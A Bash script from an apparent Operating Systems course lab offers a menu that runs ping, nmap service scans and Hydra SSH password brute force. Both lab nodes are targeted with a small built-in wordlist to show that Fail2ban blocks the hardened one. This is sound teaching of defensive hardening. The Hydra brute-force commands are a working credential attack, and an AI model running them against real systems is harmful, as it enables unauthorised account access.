#!/bin/bash
# ==============================================================================
# SKRIP ATTACKER SUITE: NODE 1 - RED TEAM ATTACKER (KALI LINUX)
# Mata Kuliah: Sistem Operasi
# Digunakan untuk menjalankan simulasi serangan ke Node Unhardened & Hardened
# ==============================================================================

# GANTI IP BERIKUT ATAU GUNAKAN MENU 6 UNTUK SIMPAN PERMANEN
CONFIG_FILE="$(dirname "$0")/.target_config"
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
fi

IP_HARDENED="${IP_HARDENED:-192.168.1.20}"
IP_UNHARDENED="${IP_UNHARDENED:-192.168.1.31}"
TARGET_USER="${TARGET_USER:-korban}"

# Direktori log hasil pengujian
OUTPUT_DIR="./hasil_pengujian"
mkdir -p "$OUTPUT_DIR"

show_menu() {
    clear
    echo "=========================================================="
    echo "   SUITE PENGUJIAN KEAMANAN SISTEM OPERASI (ATTACKER)    "
    echo "=========================================================="
    echo " IP Target Hardened   : $IP_HARDENED"
    echo " IP Target Unhardened : $IP_UNHARDENED"
    echo " Target User SSH      : $TARGET_USER"
    echo "=========================================================="
    echo " 1. Uji 1: Ping Sweep & Verifikasi Latensi Jaringan (< 5ms)"
    echo " 2. Uji 2: Nmap Port Scanning & Firewall Filtering"
    echo " 3. Uji 3: Hydra Brute Force SSH pada Unhardened Target"
    echo " 4. Uji 4: Hydra Brute Force SSH pada Hardened Target (Fail2ban)"
    echo " 5. Jalankan Seluruh Skenario Pengujian Otomatis"
    echo " 6. Ubah IP Target"
    echo " 7. Keluar"
    echo "=========================================================="
    read -p "Pilih menu [1-7]: " pilihan
}

create_wordlist() {
    # Buat wordlist kecil untuk demonstrasi cepat
    cat << 'EOF' > "$OUTPUT_DIR/passwords.txt"
admin
123456
qwerty
root
toor
pass123
password
coba123
password123
rahasia
EOF
}

test_latency() {
    echo ""
    echo "[*] Menjalankan Uji 1: Ping Latency & Konektivitas..."
    echo "--- Ping ke Unhardened ($IP_UNHARDENED) ---"
    ping -c 4 "$IP_UNHARDENED" | tee "$OUTPUT_DIR/ping_unhardened.txt"
    echo ""
    echo "--- Ping ke Hardened ($IP_HARDENED) ---"
    ping -c 4 "$IP_HARDENED" | tee "$OUTPUT_DIR/ping_hardened.txt"
    echo "[+] Hasil latensi tersimpan di $OUTPUT_DIR/ping_*.txt"
    read -p "Tekan [Enter] untuk kembali ke menu..."
}

test_nmap() {
    echo ""
    echo "[*] Menjalankan Uji 2: Nmap Port Scanning & Firewall Filtering..."
    echo "[>] Memindai Node Unhardened ($IP_UNHARDENED)..."
    nmap -sV -T4 -F "$IP_UNHARDENED" | tee "$OUTPUT_DIR/nmap_unhardened.txt"
    echo ""
    echo "[>] Memindai Node Hardened ($IP_HARDENED)..."
    nmap -sV -T4 -F "$IP_HARDENED" | tee "$OUTPUT_DIR/nmap_hardened.txt"
    echo ""
    echo "[+] Pemindaian selesai. Bandingkan jumlah port terbuka di $OUTPUT_DIR/nmap_*.txt"
    read -p "Tekan [Enter] untuk kembali ke menu..."
}

test_hydra_unhardened() {
    create_wordlist
    echo ""
    echo "[*] Menjalankan Uji 3: Hydra Brute Force ke Unhardened Node ($IP_UNHARDENED)..."
    echo "[!] Target tidak memiliki Fail2ban. Password diprediksi akan BERHASIL ditembus."
    hydra -l "$TARGET_USER" -P "$OUTPUT_DIR/passwords.txt" ssh://"$IP_UNHARDENED" -t 4 -vV | tee "$OUTPUT_DIR/hydra_unhardened.txt"
    echo ""
    echo "[+] Selesai. Periksa bukti kredensial yang berhasil ditembus di $OUTPUT_DIR/hydra_unhardened.txt"
    read -p "Tekan [Enter] untuk kembali ke menu..."
}

test_hydra_hardened() {
    create_wordlist
    echo ""
    echo "[*] Menjalankan Uji 4: Hydra Brute Force ke Hardened Node ($IP_HARDENED)..."
    echo "[!] Target dilindungi Fail2ban & UFW. Koneksi diprediksi akan TERBLOKIR setelah 3x gagal."
    hydra -l "$TARGET_USER" -P "$OUTPUT_DIR/passwords.txt" ssh://"$IP_HARDENED" -t 4 -vV | tee "$OUTPUT_DIR/hydra_hardened.txt"
    echo ""
    echo "[*] Menguji apakah IP Attacker sudah di-banned secara otomatis..."
    echo "[>] Mencoba koneksi SSH ulang:"
    ssh -o ConnectTimeout=5 "$TARGET_USER@$IP_HARDENED"
    echo ""
    echo "[+] Jika muncul 'Connection refused' atau 'Operation timed out', proteksi Fail2ban 100% SUKSES!"
    read -p "Tekan [Enter] untuk kembali ke menu..."
}

change_ip() {
    read -p "Masukkan IP Target Hardened baru   : " NEW_HARDENED
    read -p "Masukkan IP Target Unhardened baru : " NEW_UNHARDENED
    read -p "Masukkan Target Username baru      : " NEW_USER

    [ -n "$NEW_HARDENED" ] && IP_HARDENED="$NEW_HARDENED"
    [ -n "$NEW_UNHARDENED" ] && IP_UNHARDENED="$NEW_UNHARDENED"
    [ -n "$NEW_USER" ] && TARGET_USER="$NEW_USER"

    cat << EOF > "$CONFIG_FILE"
IP_HARDENED="$IP_HARDENED"
IP_UNHARDENED="$IP_UNHARDENED"
TARGET_USER="$TARGET_USER"
EOF
    echo "[+] Konfigurasi IP berhasil disimpan secara permanen di $CONFIG_FILE!"
    sleep 1
}

while true; do
    show_menu
    case $pilihan in
        1) test_latency ;;
        2) test_nmap ;;
        3) test_hydra_unhardened ;;
        4) test_hydra_hardened ;;
        5) 
           test_latency
           test_nmap
           test_hydra_unhardened
           test_hydra_hardened
           ;;
        6) change_ip ;;
        7) exit 0 ;;
        *) echo "Pilihan tidak valid!" ; sleep 1 ;;
    esac
done
